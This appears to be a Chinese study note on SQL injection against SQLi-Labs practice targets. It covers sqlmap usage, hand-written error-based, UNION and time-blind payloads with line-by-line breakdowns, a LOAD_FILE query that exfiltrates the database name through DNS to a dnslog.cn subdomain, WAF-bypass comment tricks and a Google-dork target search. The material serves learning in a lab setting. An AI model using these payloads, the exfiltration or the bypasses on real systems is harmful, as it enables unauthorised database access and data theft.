+<h3 id="error-based"><a href="#error-based" class="headerlink" title="error-based"></a>error-based</h3><h4 id="首先如何确认有SQL注入呢"><a href="#首先如何确认有SQL注入呢" class="headerlink" title="首先如何确认有SQL注入呢?"></a>首先如何确认有SQL注入呢?</h4><p>根据上面所学，我们可以使用’”等，来进行报错，进而判断有无注入点。<br><img src="pass1.png"></p>
+<p>我们再本机环境中测试，发现错误与靶场所爆出的错误基本相同，</p>
+<p><img src="pass1-2.png"></p>
+<p>而查看源文件的SQL语句为，</p>
+<pre class="line-numbers language-none"><code class="language-none">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">SELECT * FROM users WHERE user_id &#x3D; &#39;$id&#39; -- &#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>我们再试一下”呢，然而没有用。</p>
+<p>如果想学手工注入，则可以看sqlmap中xml语句，进行学习。</p>
+<h4 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h4><ol>
+<li>在以下的界面中，我们可以进行选择获得的信息，譬如我选择了获得当前数据库名。  </li>
+</ol>
+<p><img src="sqlmap-dk-1.png"></p>
+<p>命令行中语句为</p>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap -u &#39;http:&#x2F;&#x2F;ec741729-e1f3-4c04-96e6-f8823694221f.node4.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&#39; --skip-static --technique&#x3D;E --current-db<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>–technique=E为报错注入，–current-db，为获得当前的数据库。</p>
+<ol start="2">
+<li>如果获得当前的用户名呢？</li>
+</ol>
+<p>很明显–current-user。</p>
+<pre class="line-numbers language-语句为" data-language="语句为"><code class="language-语句为">1&#39; AND (SELECT 7663 FROM(SELECT COUNT(*),CONCAT(0x716b766a71,(MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,54)),0x716a7a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- vNjX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-结果为" data-language="结果为"><code class="language-结果为">18:46:41] [INFO] fetching current user
+[18:46:41] [INFO] retrieved: &#39;root@localhost&#39;
+current user: &#39;root@localhost&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<ol start="3">
+<li>此外还能获得其他很多信息，譬如：表，列，等</li>
+</ol>
+<p>那么如果只是查询一个特定表，特定库呢？也很简单</p>
+<pre class="line-numbers language-none"><code class="language-none">库: -D 库名
+表: -T 表名
+列: -C 列名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="Union查询"><a href="#Union查询" class="headerlink" title="Union查询"></a>Union查询</h3><p>如果不报错时，报错查询就无法使用。</p>
+<p>那么就让我们看一下sqlmap的union注入的思路</p>
+<p>首先使用判断其闭合的符号为什么。</p>
+<pre class="line-numbers language-none"><code class="language-none">19:56:54] [INFO] testing &#39;Generic UNION query (NULL) - 1 to 10 columns&#39;
+&#x3D;&gt;1
+&#x3D;&gt;1) ORDER BY 1-- -
+&#x3D;&gt;1) ORDER BY 5583-- -
+&#x3D;&gt;1 ORDER BY 1-- -
+&#x3D;&gt;1 ORDER BY 1115-- -
+&#x3D;&gt;1 ORDER BY 1-- -
+&#x3D;&gt;1 ORDER BY 3952-- -
+&#x3D;&gt;1&#39;) ORDER BY 1-- -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后判断有几列</p>
+<pre class="line-numbers language-none"><code class="language-none"> [INFO] &#39;ORDER BY&#39; technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+&#x3D;&gt;1&#39; ORDER BY 10-- -
+&#x3D;&gt;1&#39; ORDER BY 6-- -
+&#x3D;&gt;1&#39; ORDER BY 4-- -
+&#x3D;&gt;1&#39; ORDER BY 3-- -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>之后判断是否有注入点</p>
+<pre class="line-numbers language-none"><code class="language-none">19:56:56] [INFO] target URL appears to have 3 columns in query
+&#x3D;&gt;1&#39; UNION ALL SELECT NULL,CONCAT(0x716b766a71,0x62514944434e754576417366414f73726d647772597649646d5571494a7a6c616a71504b76684a6c,0x716a7a7871),NULL-- -
+&#x3D;&gt;1&#39; UNION ALL SELECT NULL,NULL,CONCAT(0x716b766a71,0x6e7a49536f61696a6c41486747774d79596c514650434e43665a464e765a4148764b736672435065,0x716a7a7871)-- -
+&#x3D;&gt;1&#39; UNION ALL SELECT CONCAT(0x716b766a71,0x6b546266597147457879727172504b7a7659596e717a48695043684963435a744465637776654c76,0x716a7a7871),NULL,NULL-- -
+&#x3D;&gt;1&#39; UNION ALL SELECT NULL,CONCAT(0x716b766a71,0x4b6b4573774577746151,0x716a7a7871),NULL-- -
+&#x3D;&gt;1&#39; UNION ALL SELECT NULL,NULL,CONCAT(0x716b766a71,0x74675064785a587a5658,0x716a7a7871)-- -
+&#x3D;&gt;1&#39; UNION ALL SELECT CONCAT(0x716b766a71,0x5758584e6e73634a6a52,0x716a7a7871),NULL,NULL-- -
+&#x3D;&gt;-3620&#39; UNION ALL SELECT NULL,CONCAT(0x716b766a71,0x45626e76634a704b5a4a48486846777357454c665072487a6662676c4c436e694e4b55477545534c,0x716a7a7871),NULL-- -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>再然后判断是否为DBA</p>
+<pre class="line-numbers language-none"><code class="language-none">-7861&#39; UNION ALL SELECT NULL,
+CONCAT(0x716b766a71,
+(CASE WHEN  																													-- WHEN a THEN b ELSE c END 相当于 if a &#123;b;&#125;
+(																																		  -- else c;
+(SELECT super_priv FROM mysql.user WHERE user&#x3D;0x726f6f74 LIMIT 0,1)
+&#x3D;0x59
+)
+ THEN 1 
+ ELSE 0
+	END),
+0x716a7a7871),NULL-- -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其实操作与报错查询也基本一样。</p>
+<h3 id="boolen"><a href="#boolen" class="headerlink" title="boolen"></a>boolen</h3><p>靶场为SQL-Labs less11</p>
+<p>首先此关卡为POST方式，所以指令方面与上面有所不同</p>
+<pre class="line-numbers language-none"><code class="language-none">--method post --data &quot;passwd&#x3D;-111&#39;&amp;submit&#x3D;Submit&amp;uname&#x3D;111&quot; -p uname -tamper&#x3D;print-.py -technique B<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>–method为post方式请求。–data 为数据包内容，-p为注入的目标 后面的与之前相同。</p>
+<h3 id="Time"><a href="#Time" class="headerlink" title="Time"></a>Time</h3><p>可以再request页面打开写有请求头的文件来进行注入，注入点标记为*</p>
+<p><img src="sqlmap2.png"></p>
+<p>注意sqlmap的请求头部中USER-Agent，一般都会带着sqlmap的特定信息，所以我们需要进行修改。</p>
+<p>moblie就代表着将报文伪装成手机端。 random-agent一般都要携带。</p>
+<p><img src="sqlmap3.png"></p>
+<h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><h3 id="OOB"><a href="#OOB" class="headerlink" title="OOB"></a>OOB</h3><p>上面所学的都为In band的注入。既然有In Band 那么便有out of band,” <strong>OOB</strong> “</p>
+<p><img src="inout.png"></p>
+<p>第三方使用的就是<a href="dnslog.cn">dnslog.cn</a></p>
+<p>我们再使用时，可能也会使用到如下语句</p>
+<pre class="line-numbers language-none"><code class="language-none">SELECT LOAD_FILE(&#39;a&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>此语句的作用就为打开文件，使用的协议为unc（远程访问一个文件）</p>
+<p>在Windows中运行中可以使用\加域名之类的，来进行远程访问</p>
+<p>那么如何注入使用呢？很简单看下面</p>
+<pre class="line-numbers language-none"><code class="language-none">SELECT load_file(CONCAT(&#39;\\\\&#39;,(SELECT DATABASE()),&#39;.8er59e.dnslog.cn\\1.txt&#39;))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>最后结果会显示在dnslog上，为 数据库名.域名。之所以使用四个反斜线是为了转义。</p>
+<pre class="line-numbers language-none"><code class="language-none">\\root.8er59e.dnslog.cn\1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information.schema"></a>information.schema</h3><p>系统数据库</p>
+<p>存储数据库的基本信息，譬如各个数据库的表，用户等等等。 在注入语句中经常会出现这个库</p>
+<p><img src="information_schema.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">1&#39; AND (SELECT 9014 FROM(SELECT COUNT(*),CONCAT(0x716b766a71,(SELECT MID((IFNULL(CAST(grantee AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 113,1),0x716a7a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- PNUb
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+
+
+
+<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="获得注入点"><a href="#获得注入点" class="headerlink" title="获得注入点"></a>获得注入点</h4><p>报错注入payload:</p>
+<pre class="line-numbers language-none"><code class="language-none">id&#x3D;1&#39; AND (SELECT 1710 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(SELECT (ELT(1710&#x3D;1710,1))),0x716b626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TBlX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>分解:</p>
+<pre class="line-numbers language-none"><code class="language-none">SELECT
+	1710 
+FROM
+	(
+	SELECT
+		COUNT(*),
+		CONCAT(
+			0x716a6a7171,(
+			SELECT
+				(
+				ELT( 1710 &#x3D; 1710, 1 ))),      -- ELT(a,b,c,d, ....) 为a&#x3D;1取b,为2取c,为3取d依次类推
+			0x716b626a71,                   -- 其实就是Ascii码
+		FLOOR( RAND( 0 )* 2 )) x          -- 该函数返回X的最大整数值，但不能大于X; MySQL Rand() 函数可以被调用，以产生一个在 0 和 1 之间的随机数：
+                                      -- 如果在一条查询语句中rand內的值相同，那么rand出值也相同。
+	FROM
+		INFORMATION_SCHEMA.PLUGINS 
+	GROUP BY
+	x                                   -- x为concat得出的结果，结果为qjjqq1qkbjq0 很明显你不能这样进行分组，直接报错了。
+	) a -- TBlX<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="获得当前用户"><a href="#获得当前用户" class="headerlink" title="获得当前用户"></a>获得当前用户</h4><p>我们知道了有注入点，接下来就是获得数据库的相关信息了，这里一当前用户为例</p>
+<pre class="line-numbers language-none"><code class="language-none">1&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,54)),0x716b626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uwIe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>分解</p>
+<pre class="line-numbers language-none"><code class="language-none">SELECT
+	1343 
+FROM
+	(
+	SELECT
+		COUNT(*),
+		CONCAT(
+			0x716a6a7171,(
+			MID                      -- SELECT MID(ColumnName, Start [, Length])
+                               -- 从start开始(初始值为1)，从columnName中截取长度为Length的字符串。
+      (
+        ( IFNULL               -- IFNULL它接受两个参数，如果不是NULL，则返回第一个参数。 否则，IFNULL函数返回第二个参数。
+
+        ( CAST( CURRENT_USER () AS NCHAR ), 
+        0x20 )),               -- CAST()函数将任何类型的值转换为具有指定类型的值。目标类型可以是以下类型之一：BINARY，
+         1, 54 )               -- CHAR，DATE，DATETIME，TIME，DECIMAL，SIGNED，UNSIGNE
+        ), 
+        , 																																	
+			0x716b626a71,
+		FLOOR( RAND( 0 )* 2 )) x 
+	FROM
+		INFORMATION_SCHEMA.PLUGINS 
+	GROUP BY
+		x 
+	) a 
+	) -- uwIe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>经过分解我们知道了上面语句工作原理，通过Current_user()来进行查询现在的用户，并通过报错的方式来进行显示。</p>
+<p>查询表payload为</p>
+<pre class="line-numbers language-none"><code class="language-none">1&#39; AND (SELECT 9086 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(SELECT MID((IFNULL(CAST(table_schema AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x637466747261696e696e67,0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61,0x7365637572697479,0x74657374) LIMIT 161,1),0x716b626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- DOMI<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>根据上面两个语句，我们完全可以自己写为，payload为,若要查看其他包只需要修改concat中LIMITa,1中a。</p>
+<p>至于查列等，完全一个思路。</p>
+<pre class="line-numbers language-none"><code class="language-none">1&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(SELECT MID((IFNULL(CAST((table_schema) AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),0x716b626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uwIe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>结果为<br><img src="payload1.png"></p>
+<h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>继续上面的步骤</p>
+<p>payload为</p>
+<pre class="line-numbers language-none"><code class="language-none">id&#x3D;-5409&#39; UNION ALL SELECT NULL,NULL,CONCAT(0x716a6a7171,0x6e4f6c51756c414255704d66767a6e6361737062516b617977624e4b6f734b61567a674a74446265,0x716b626a71)-- -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这个语句十分简单，就是判断数据库有几列的。没什么可说的</p>
+<p>接下查询一下表</p>
+<pre class="line-numbers language-none"><code class="language-none">-6736&#39; UNION ALL SELECT NULL,NULL,(SELECT CONCAT(0x716a6a7171,IFNULL(CAST(table_schema AS NCHAR),0x20),0x666d62757070,IFNULL(CAST(table_name AS NCHAR),0x20),0x716b626a71) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x637466747261696e696e67,0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61,0x7365637572697479,0x74657374) LIMIT 44,1)-- -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>接下继续分析</p>
+<pre class="line-numbers language-none"><code class="language-none">SELECT NULL
+	,
+	NULL,(   -- 7information_schema7INNODB_TEMP_TABLE_INFO7
+	SELECT
+		CONCAT( 0x37, 
+		IFNULL( CAST( table_schema AS NCHAR ), 0x20 ), 
+		0x37,
+		 
+		IFNULL( CAST( table_name AS NCHAR ), 0x20 ),
+		 0x37 ) 
+	FROM
+		INFORMATION_SCHEMA.TABLES 
+	WHERE
+		table_schema IN ( 0x637466747261696e696e67, 0x696e666f726d6174696f6e5f736368656d61, 0x6d7973716c, 0x706572666f726d616e63655f736368656d61, 0x7365637572697479, 0x74657374 ) 
+		LIMIT 44,
+	1 
+	) -- -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>  这个语句总体来并没有我们不会的点，它的函数我们在上面报错查询的时候已经解释了。那么这个语句是如何工作的呢？很简单，其实就是通过table_schema以及table_name from information.schema.tables中得到的表的相关信息。至于这个库我们在上面也已经说过了。很简单对吧。</p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>获得注入点</p>
+<pre class="line-numbers language-none"><code class="language-none">id&#x3D;1&#39; AND (SELECT 9312 FROM (SELECT(SLEEP(5)))fwfI)-- JUHW<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>核心函数就是sleep(5)</p>
+<p>获得有哪些数据库怎么看呢?payload如下</p>
+<pre class="line-numbers language-none"><code class="language-none">1 AND (SELECT 6762 FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 5,1),5,1))&gt;1,0,1)))))cjhE)-- DmLI<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>分解</p>
+<pre class="line-numbers language-none"><code class="language-none">1 
+AND (
+	SELECT
+		6762 
+	FROM
+		(
+		SELECT
+			(
+				SLEEP(
+					1- (
+					IF                      
+						(
+							ORD(																					
+							-- 如果最左边的字符不是一个多字节字符，ORD()返回的值和ASCII()函数返回的值相同。
+
+							MID(
+							( 
+							SELECT DISTINCT ( 
+							IFNULL(
+							 CAST( schema_name AS NCHAR ), 0x20 
+							 )
+							 ) 
+							FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 5, 1 )
+							, 5, 1 )
+							)&gt; 1,																					-- 通过大于判断来获得所取字符串的ascii码
+							0,                                            -- 大于1则取0，否则取1
+							1 
+						))))) cjhE                                      -- “1 - 语句” 的意思便为只要所取的子字符串符合判断便不sleep
+                                                            -- 由此获得所包含的数据库
+	) -- DmLI<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>通过上面的分析，我们便可以知道时间盲注的原理。</p>
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>不再赘述，如果想研究，可以自己使用sqlmap来进行测试。</p>
+<h3 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h3><h4 id="堆叠注入。"><a href="#堆叠注入。" class="headerlink" title="堆叠注入。"></a>堆叠注入。</h4><p>其实就是多条语句进行执行，没什么特别的。</p>
+<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>可以使用以下网站进行正则表达式的匹配。<br><a target="_blank" rel="noopener" href="https://regex101.com/">https://regex101.com/</a></p>
+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>// 使用x64Debug对安全狗进行逆向分析。</p>
+<p>安全狗</p>
+<p>and 绕过</p>
+<pre class="line-numbers language-none"><code class="language-none">Select * from user where id &#x3D;1 &#x2F;*%&#x2F;&quot;!*&#x2F; and&#x2F;*%&#x2F;&quot;!*&#x2F; 1&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>union 绕过</p>
+<pre class="line-numbers language-none"><code class="language-none">Select * from user &#x2F;*%&#x2F;&quot;!*&#x2F;UNION&#x2F;*%&#x2F;&quot;!*&#x2F; &#x2F;*%&#x2F;&quot;!*&#x2F;SELECT &#x2F;*%&#x2F;&quot;!*&#x2F;1,2,3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Sleep</p>
+<pre class="line-numbers language-none"><code class="language-none">可以通过增加空格<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><h3 id="目标选择"><a href="#目标选择" class="headerlink" title="目标选择"></a>目标选择</h3><h4 id="u-URL"><a href="#u-URL" class="headerlink" title="-u URL"></a>-u URL</h4><h4 id="c-CONFIG"><a href="#c-CONFIG" class="headerlink" title="-c CONFIG"></a>-c CONFIG</h4><pre class="line-numbers language-none"><code class="language-none">读取记录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="x-SITEMAPURL"><a href="#x-SITEMAPURL" class="headerlink" title="-x SITEMAPURL"></a>-x SITEMAPURL</h4><pre class="line-numbers language-none"><code class="language-none">从xml文件中解析目标<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="m-BULKFILE"><a href="#m-BULKFILE" class="headerlink" title="-m BULKFILE"></a>-m BULKFILE</h4><pre class="line-numbers language-none"><code class="language-none">大文件读取<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="r-REQUEST"><a href="#r-REQUEST" class="headerlink" title="-r REQUEST"></a>-r REQUEST</h4><pre class="line-numbers language-none"><code class="language-none">加载HTTP请求报文<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="g-GOOGLEDORK"><a href="#g-GOOGLEDORK" class="headerlink" title="-g GOOGLEDORK"></a>-g GOOGLEDORK</h4><pre class="line-numbers language-none"><code class="language-none">通过谷歌搜索得到的url作为目标
+
+inurl:php?id&#x3D;1
+sqlmap.py -g &quot;inurl:\&quot;.php?id&#x3D;1\&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="–wizard"><a href="#–wizard" class="headerlink" title="–wizard"></a>–wizard</h4><pre class="line-numbers language-none"><code class="language-none">引导操作<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h3><h4 id="–method-METHOD"><a href="#–method-METHOD" class="headerlink" title="–method=METHOD"></a>–method=METHOD</h4><pre class="line-numbers language-none"><code class="language-none">POST
+GET
+HEAD
+PUT
+DELETE
+CONNECT
+OPINIONS
+TRACE
+PARCH<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="–data-DATA"><a href="#–data-DATA" class="headerlink" title="–data=DATA"></a>–data=DATA</h4><pre class="line-numbers language-none"><code class="language-none">指定POST参数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–param-del-PARA-Character-used-for-splitting-parameter-values"><a href="#–param-del-PARA-Character-used-for-splitting-parameter-values" class="headerlink" title="–param-del=PARA.. Character used for splitting parameter values"></a>–param-del=PARA.. Character used for splitting parameter values</h4><pre class="line-numbers language-none"><code class="language-none">譬如将data中参数进行拆分<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–cookie-COOKIE"><a href="#–cookie-COOKIE" class="headerlink" title="–cookie=COOKIE"></a>–cookie=COOKIE</h4><pre class="line-numbers language-none"><code class="language-none">指定cookie的值<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–cookie-del-COO"><a href="#–cookie-del-COO" class="headerlink" title="–cookie-del=COO"></a>–cookie-del=COO</h4><pre class="line-numbers language-none"><code class="language-none">分割cookie值的字符<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–load-cookies"><a href="#–load-cookies" class="headerlink" title="–load-cookies"></a>–load-cookies</h4><pre class="line-numbers language-none"><code class="language-none">从文件中读取cookie的值，格式为Netscape&#x2F;wget<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–drop-set-cookie"><a href="#–drop-set-cookie" class="headerlink" title="–drop-set-cookie"></a>–drop-set-cookie</h4><pre class="line-numbers language-none"><code class="language-none">丢弃响应头中set-cookie<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–user-agent-HTTP-User-Agent"><a href="#–user-agent-HTTP-User-Agent" class="headerlink" title="–user-agent HTTP User-Agent"></a>–user-agent HTTP User-Agent</h4><pre class="line-numbers language-none"><code class="language-none">设置user-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–random-agent-Use-radomly-selected-HTTP-User-Agent-header-value"><a href="#–random-agent-Use-radomly-selected-HTTP-User-Agent-header-value" class="headerlink" title="–random-agent  Use radomly selected HTTP User-Agent header value"></a>–random-agent  Use radomly selected HTTP User-Agent header value</h4><pre class="line-numbers language-none"><code class="language-none">随机选用sqlmap目录中User-Agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–host-HOST"><a href="#–host-HOST" class="headerlink" title="–host=HOST"></a>–host=HOST</h4><pre class="line-numbers language-none"><code class="language-none">选择HOST<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–referer-REFERER"><a href="#–referer-REFERER" class="headerlink" title="–referer=REFERER"></a>–referer=REFERER</h4><pre class="line-numbers language-none"><code class="language-none">修改referer值<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="H-HEADER-–hea"><a href="#H-HEADER-–hea" class="headerlink" title="-H HEADER –hea"></a>-H HEADER –hea</h4><pre class="line-numbers language-none"><code class="language-none">指定任何一个头部
+-H &quot;host&#x3D;127.0.0.1\n xxx:nnn&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h4 id="–auth-type-AUTH"><a href="#–auth-type-AUTH" class="headerlink" title="–auth-type=AUTH .."></a>–auth-type=AUTH ..</h4><pre class="line-numbers language-none"><code class="language-none">指定http认证类型<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–auth-file-AUTH"><a href="#–auth-file-AUTH" class="headerlink" title="–auth-file=AUTH"></a>–auth-file=AUTH</h4><pre class="line-numbers language-none"><code class="language-none">制定一个私钥文件来认证<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–ignore-401"><a href="#–ignore-401" class="headerlink" title="–ignore-401"></a>–ignore-401</h4><pre class="line-numbers language-none"><code class="language-none">忽略401错误<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–proxy-PROXY"><a href="#–proxy-PROXY" class="headerlink" title="–proxy=PROXY"></a>–proxy=PROXY</h4><pre class="line-numbers language-none"><code class="language-none">添加代理<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–proxy-cred-PRO"><a href="#–proxy-cred-PRO" class="headerlink" title="–proxy-cred=PRO"></a>–proxy-cred=PRO</h4><pre class="line-numbers language-none"><code class="language-none">代理认证方式
+譬如:用户名密码。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h4 id="–proxy-file"><a href="#–proxy-file" class="headerlink" title="–proxy-file="></a>–proxy-file=</h4><h4 id="–ignore-proxy"><a href="#–ignore-proxy" class="headerlink" title="–ignore-proxy"></a>–ignore-proxy</h4><h4 id="–tor-TOR"><a href="#–tor-TOR" class="headerlink" title="–tor=TOR"></a>–tor=TOR</h4><h4 id="–tor-port-TOR-PORT"><a href="#–tor-port-TOR-PORT" class="headerlink" title="–tor-port=TOR-PORT"></a>–tor-port=TOR-PORT</h4><h4 id="–check-tor-Check-to-see-if-TOr-is-used-properly"><a href="#–check-tor-Check-to-see-if-TOr-is-used-properly" class="headerlink" title="–check-tor  Check to see if TOr is used properly"></a>–check-tor  Check to see if TOr is used properly</h4><h4 id="–delay-DELAY"><a href="#–delay-DELAY" class="headerlink" title="–delay=DELAY"></a>–delay=DELAY</h4><pre class="line-numbers language-none"><code class="language-none">设置每个HTTP请求延迟<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–timeout-TIMEOUT"><a href="#–timeout-TIMEOUT" class="headerlink" title="–timeout=TIMEOUT"></a>–timeout=TIMEOUT</h4><pre class="line-numbers language-none"><code class="language-none">设置超时时间,默认30s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–retires-RETIRES"><a href="#–retires-RETIRES" class="headerlink" title="–retires=RETIRES"></a>–retires=RETIRES</h4><pre class="line-numbers language-none"><code class="language-none">设置重试次数，默认3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="–randomize-RPARAM"><a href="#–randomize-RPARAM" class="headerlink" title="–randomize=RPARAM"></a>–randomize=RPARAM</h4><pre class="line-numbers language-none"><code class="language-none">随机地更改给定参数的值 sqlmap -u xxx.com?id&#x3D;1 -- randommize&#x3D;id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
